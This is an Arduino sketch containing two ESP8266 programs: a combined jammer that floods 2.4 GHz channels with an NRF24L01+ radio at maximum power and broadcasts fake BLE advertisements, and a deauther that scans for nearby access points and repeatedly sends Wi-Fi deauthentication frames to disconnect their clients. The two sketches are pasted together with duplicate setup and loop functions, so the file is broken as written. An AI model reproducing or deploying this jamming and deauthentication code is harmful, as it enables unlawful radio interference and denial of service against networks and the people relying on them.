/**
 * ! @file Gracia.ino
 * ! @brief THIS FILE IS ONLY AN TEMPORARY FILE FOR TESTING PURPOSES.
 */

// ESP8266 + NRF24L01+ Cooperative Jammer
// Concept: ESP8266 handles valid 802.11 deauth packets (Wi-Fi disruption)
// NRF24L01+ handles high-power wideband RF flooding (broadband jamming)
// This mitigates NRF24’s inability to craft 802.11 frames

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}
#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>

RF24 radio(D2, D1); // CE, CSN for NRF24L01

uint8_t pattern_ff[32];
uint8_t pattern_random[32];
uint8_t pattern_ble_adv[32] = {
  0x02, 0x01, 0x06,
  0x03, 0x03, 0xAA, 0xFE,
  0x17, 0x16, 0xAA, 0xFE, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00
};

const uint8_t ble_adv_channels[] = {2, 26, 80};
int channelScores[126] = {0};
uint8_t topChannels[5] = {1, 6, 11, 2, 80};
uint8_t ble_index = 0;
unsigned long lastScanTime = 0;
unsigned long lastBleTime = 0;
uint8_t attackIndex = 0;
unsigned long lastDeauth = 0;

const uint8_t fakeAPmac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x11, 0x22};
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

void sendDeauthESP(uint8_t* target, uint8_t* ap) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, // Type/Subtype: Deauth, Duration
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],       // Destination (client or broadcast)
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],       // Source (AP)
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],       // BSSID (AP)
    0x00, 0x00,                                     // Frag/Seq
    0x07, 0x00                                      // Reason code: class 3 frame
  };
  wifi_send_pkt_freedom(packet, 26, 0);
}

void setup() {
  Serial.begin(115200);
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_set_channel(1);
  wifi_promiscuous_enable(1);
  wifi_set_channel(1);

  memset(pattern_ff, 0xFF, 32);

  radio.begin();
  radio.setAutoAck(false);
  radio.setRetries(0, 0);
  radio.setPayloadSize(32);
  radio.setDataRate(RF24_2MBPS);
  radio.setPALevel(RF24_PA_MAX);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.disableDynamicPayloads();
  radio.stopListening();
}

void scanChannels() {
  for (uint8_t ch = 0; ch < 126; ch++) {
    radio.setChannel(ch);
    radio.startListening();
    delayMicroseconds(200);
    if (radio.testCarrier()) {
      channelScores[ch]++;
    }
    radio.stopListening();
  }
  for (int i = 0; i < 5; i++) topChannels[i] = 0;
  for (uint8_t ch = 0; ch < 126; ch++) {
    for (int i = 0; i < 5; i++) {
      if (channelScores[ch] > channelScores[topChannels[i]]) {
        for (int j = 4; j > i; j--) topChannels[j] = topChannels[j - 1];
        topChannels[i] = ch;
        break;
      }
    }
  }
  memset(channelScores, 0, sizeof(channelScores));
}

void attackChannel(uint8_t chan) {
  radio.setChannel(chan);
  uint64_t addr = 0xF0F0F0F000 ^ millis();
  radio.openWritingPipe(addr);
  for (int i = 0; i < 32; i++) {
    pattern_random[i] = (chan * i) ^ (millis() & 0xFF);
  }
  radio.write(pattern_ff, 32);
  delayMicroseconds(150);
  radio.write(pattern_random, 32);
  delayMicroseconds(150);
}

void loop() {
  unsigned long now = millis();

  if (now - lastScanTime > 3000) {
    scanChannels();
    lastScanTime = now;
    attackIndex = 0;
  }

  attackChannel(topChannels[attackIndex % 5]);
  attackIndex++;

  if (now - lastBleTime > 5) {
    uint8_t ble_chan = ble_adv_channels[ble_index % 3];
    radio.setChannel(ble_chan);
    radio.openWritingPipe(0xABABABAB00 ^ now);
    radio.write(pattern_ble_adv, 32);
    ble_index++;
    lastBleTime = now;
  }

  if (now - lastDeauth > 300) {
    sendDeauthESP(broadcast, fakeAPmac);
    lastDeauth = now;
  }
}

// ESP8266 Deauther with Dual Modes (Auto Scan + Broadcast, and Targeted Broadcast)
// Requires: ESP8266WiFi, ESP8266 SDK access

#include <ESP8266WiFi.h>
extern "C" {
  #include "user_interface.h"
}

// === CONFIGURATION ===
#define MAX_APS 5
#define DEAUTH_INTERVAL 100
#define AUTO_SCAN_MODE true  // Set to false for targeted switching mode

// === GLOBAL STRUCTS ===
struct AP {
  uint8_t mac[6];
  uint8_t channel;
};

AP apList[MAX_APS];
int apCount = 0;
int currentTarget = 0;

// === DEAUTH PACKET TEMPLATE ===
uint8_t deauthPacket[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // dest (broadcast)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // src (AP)
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // bssid (AP)
  0x00, 0x00,
  0x07, 0x00
};

// === PROMISCUOUS CALLBACK ===
void snifferCallback(uint8_t* buf, uint16_t len) {
  if (len < 36) return;
  uint8_t frameType = buf[0];
  if ((frameType & 0xF0) == 0x80 && apCount < MAX_APS) { // beacon frame
    uint8_t* bssid = &buf[10];
    bool known = false;
    for (int i = 0; i < apCount; i++) {
      if (memcmp(apList[i].mac, bssid, 6) == 0) {
        known = true;
        break;
      }
    }
    if (!known) {
      memcpy(apList[apCount].mac, bssid, 6);
      apList[apCount].channel = buf[36]; // channel info location
      apCount++;
    }
  }
}

void setDeauthMACs(uint8_t* mac) {
  memcpy(&deauthPacket[10], mac, 6); // source
  memcpy(&deauthPacket[16], mac, 6); // BSSID
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb(snifferCallback);
  wifi_promiscuous_enable(1);

  Serial.println("[INFO] Scanning for APs...");
  delay(5000);  // scan time
  wifi_promiscuous_enable(0);
  Serial.printf("[INFO] Found %d APs.\n", apCount);
}

void loop() {
  if (AUTO_SCAN_MODE) {
    // === AUTO SCAN MODE ===
    for (int i = 0; i < apCount; i++) {
      wifi_set_channel(apList[i].channel);
      setDeauthMACs(apList[i].mac);
      Serial.printf("[AUTO] Deauthing on CH%d - MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    apList[i].channel,
                    apList[i].mac[0], apList[i].mac[1], apList[i].mac[2],
                    apList[i].mac[3], apList[i].mac[4], apList[i].mac[5]);
      for (int j = 0; j < 10; j++) {
        wifi_send_pkt_freedom(deauthPacket, 26, 0);
        delay(DEAUTH_INTERVAL);
      }
    }
  } else {
    // === TARGETED MODE WITH SWITCHING ===
    wifi_set_channel(apList[currentTarget].channel);
    setDeauthMACs(apList[currentTarget].mac);
    Serial.printf("[TARGET] Deauthing AP %d: CH%d MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  currentTarget,
                  apList[currentTarget].channel,
                  apList[currentTarget].mac[0], apList[currentTarget].mac[1], apList[currentTarget].mac[2],
                  apList[currentTarget].mac[3], apList[currentTarget].mac[4], apList[currentTarget].mac[5]);

    for (int j = 0; j < 10; j++) {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delay(DEAUTH_INTERVAL);
    }

    currentTarget = (currentTarget + 1) % apCount;
    delay(1000); // switch delay
  }
}
